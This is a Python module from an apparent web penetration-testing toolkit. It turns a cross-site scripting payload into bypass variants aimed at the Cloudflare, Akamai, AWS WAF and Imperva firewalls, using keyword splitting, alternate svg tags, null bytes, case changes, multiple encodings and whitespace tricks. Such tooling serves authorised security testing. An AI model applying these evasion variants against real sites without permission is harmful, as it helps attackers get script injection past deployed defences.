"""U-FORGE-12 — The Adversarial Generator.

WAF-specific bypass variants of a payload. The WAF corpora are the
spec's WAF_BYPASSES verbatim (cloudflare 5 / akamai 3 / aws_waf 2 /
imperva 2); each entry is applied as a deterministic transformation
of the raw payload, and the canonical payload
``<script>alert(1)</script>`` reproduces the spec examples exactly.
An unknown WAF yields nothing rather than a guess (FORGE-L-1
INGEST_DONT_INVENT). Variants keep the origin's attribution
(FORGE-L-3 ATTRIBUTION_IS_SACRED).
"""
from __future__ import annotations

import base64
import dataclasses
import hashlib
import urllib.parse

from webpent.forge.schemas import NormalizedPayload

# Spec corpus, verbatim structure (U-FORGE-12). Each entry is
# (strategy_name, transform). Imperva keeps the tab and newline
# whitespace transformations of the spec's whitespace family.
WAF_BYPASSES: dict[str, list[tuple[str, object]]] = {
    "cloudflare": [
        ("split_keywords",
         lambda raw: raw.replace("<script>", "<scr<script>ipt>")
                        .replace("</script>", "</scr</script>ipt>")),
        ("alternate_tags",
         lambda raw: raw.replace("<script>alert(1)</script>",
                                 "<svg/onload=alert(1)>")),
        ("unicode_escapes",
         lambda raw: raw.replace("<", "\\u003c").replace(">", "\\u003e")),
        ("null_bytes",
         lambda raw: raw.replace("<script>", "<script%00>")),
        ("comments",
         lambda raw: raw.replace("<script>", "<script/**/>")),
    ],
    "akamai": [
        ("hex_encoding",
         lambda raw: raw.replace("<", "%3C").replace(">", "%3E")),
        ("case_alternation",
         lambda raw: raw.replace("<script>", "<ScRiPt>")
                        .replace("</script>", "</ScRiPt>")),
        ("double_url_encoding",
         lambda raw: raw.replace("<", "%253C").replace(">", "%253E")),
    ],
    "aws_waf": [
        ("base64_wrap",
         lambda raw: "data:text/html;base64,"
                     + base64.b64encode(raw.encode()).decode()),
        ("url_twice",
         lambda raw: urllib.parse.quote(
             urllib.parse.quote(raw, safe=""), safe="")),
    ],
    "imperva": [
        ("whitespace_tab",
         lambda raw: raw.replace("<script>", "<script\t>")),
        ("whitespace_newline",
         lambda raw: raw.replace("<script>", "<script\n>")),
    ],
}


def _variant(origin: NormalizedPayload, target_waf: str,
             strategy: str, raw: str) -> NormalizedPayload:
    variant_id = hashlib.sha256(
        f"bypass|{target_waf}|{strategy}|{origin.payload_id}|{raw}"
        .encode()).hexdigest()[:16]
    attribution = dataclasses.replace(
        origin.attribution, payload_id=variant_id) \
        if origin.attribution is not None else None
    return NormalizedPayload(
        payload_id=variant_id,
        family=origin.family,
        subfamily=f"bypass_{target_waf}_{strategy}",
        raw=raw,
        target_tech=origin.target_tech,
        target_waf=origin.target_waf + (target_waf,),
        target_context=origin.target_context,
        complexity=origin.complexity,
        source="forge-adversarial",
        attribution=attribution,
        quality_score=origin.quality_score,
        novelty_score=origin.novelty_score,
        is_polyglot=origin.is_polyglot,
        chains_with=origin.chains_with,
        requires=origin.requires,
    )


def generate_bypasses(payload: NormalizedPayload, target_waf: str,
                      raw_override: str | None = None
                      ) -> list[NormalizedPayload]:
    """WAF-specific bypass variants; unknown WAF yields nothing."""
    strategies = WAF_BYPASSES.get(target_waf)
    if not strategies:
        return []
    raw = raw_override if raw_override is not None else payload.raw
    return [_variant(payload, target_waf, name, transform(raw))
            for name, transform in strategies]
